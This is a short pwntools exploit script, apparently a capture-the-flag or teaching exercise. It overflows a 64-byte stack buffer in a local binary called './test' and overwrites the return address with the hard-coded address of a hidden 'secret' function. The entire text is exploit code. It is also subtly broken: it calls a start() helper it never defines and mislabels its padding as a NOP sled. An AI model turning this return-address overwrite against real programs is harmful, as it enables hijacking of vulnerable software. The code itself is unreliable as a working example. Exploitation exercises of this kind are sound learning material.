from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')

# The filename of our vulnerable binary
exe = './test'

# Address of the secret function
secret_addr = 0x1189  # This is the start of the secret function



# Start the process
io = start()

# Pad our input
offset = 72  # 64-byte buffer + 8 bytes for saved rbp

# Build the payload
payload = flat(
    asm('nop') * offset,  # NOP sled
    secret_addr  # Address of the secret function
)

# Send the payload
io.sendlineafter(b'Type your command: ', payload)

# Receive the output
print(io.recvall().decode())

io.close()